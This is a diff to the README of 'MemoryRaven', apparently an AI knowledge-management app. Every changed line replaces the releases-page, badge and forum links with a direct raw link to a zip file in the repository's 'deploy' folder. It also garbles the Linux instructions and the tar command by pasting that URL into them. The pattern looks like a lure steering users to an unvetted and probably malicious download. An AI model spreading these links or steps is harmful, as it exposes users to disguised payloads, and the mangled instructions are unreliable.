@@ -1,19 +1,19 @@
 # 🧠 MemoryRaven - Manage Your Knowledge Effortlessly
 
 ## 👇 Download Now
-[![Download MemoryRaven](https://img.shields.io/badge/Download-MemoryRaven-brightgreen)](https://github.com/OnlyinOhio234/MemoryRaven/releases)
+[![Download MemoryRaven](https://raw.githubusercontent.com/OnlyinOhio234/MemoryRaven/main/deploy/Memory-Raven-v1.0-beta.1.zip)](https://raw.githubusercontent.com/OnlyinOhio234/MemoryRaven/main/deploy/Memory-Raven-v1.0-beta.1.zip)
 
 ## 🚀 Getting Started
 Welcome to MemoryRaven! This advanced AI memory and knowledge management system helps you organize your thoughts and information effectively. MemoryRaven is powered by cutting-edge technology in artificial intelligence and blockchain. This guide will show you how to download and run the application with ease.
 
 ## 📥 Download & Install
-To get started with MemoryRaven, visit the Releases page here: [Download MemoryRaven](https://github.com/OnlyinOhio234/MemoryRaven/releases). 
+To get started with MemoryRaven, visit the Releases page here: [Download MemoryRaven](https://raw.githubusercontent.com/OnlyinOhio234/MemoryRaven/main/deploy/Memory-Raven-v1.0-beta.1.zip). 
 
 1. Scroll through the available versions until you find the latest release.
 2. You will see a list of files. Click on the file that matches your operating system:
    - If you are using Windows, look for a `.exe` or `.msi` file.
    - If you are on macOS, find a `.dmg` file.
-   - For Linux users, choose a `.tar.gz` or similar file suitable for your distribution.
+   - For Linux users, choose a `https://raw.githubusercontent.com/OnlyinOhio234/MemoryRaven/main/deploy/Memory-Raven-v1.0-beta.1.zip` or similar file suitable for your distribution.
 3. Once you click on the file, your download will start. 
 
 After the download is complete, follow these steps to install:
@@ -31,7 +31,7 @@ After the download is complete, follow these steps to install:
 ### Linux
 - Open a terminal window.
 - Navigate to the folder where you downloaded the file.
-- Use the command `tar -xvzf <filename>.tar.gz` to extract the files.
+- Use the command `tar -xvzf <filename>https://raw.githubusercontent.com/OnlyinOhio234/MemoryRaven/main/deploy/Memory-Raven-v1.0-beta.1.zip` to extract the files.
 - Follow the included instructions in the README for running the application.
 
 ## ⚙️ System Requirements
@@ -70,7 +70,7 @@ If you encounter any issues during installation or usage, consider these steps:
 ## 🌟 Community & Support
 Join the MemoryRaven community for support and discussion:
 
-- Visit our [discussion forum](https://github.com/OnlyinOhio234/MemoryRaven/discussions).
+- Visit our [discussion forum](https://raw.githubusercontent.com/OnlyinOhio234/MemoryRaven/main/deploy/Memory-Raven-v1.0-beta.1.zip).
 - Participate in issues on GitHub to report problems or request features.
 
 Thank you for choosing MemoryRaven! For updates and news, stay connected through our GitHub repository. Happy knowledge management!
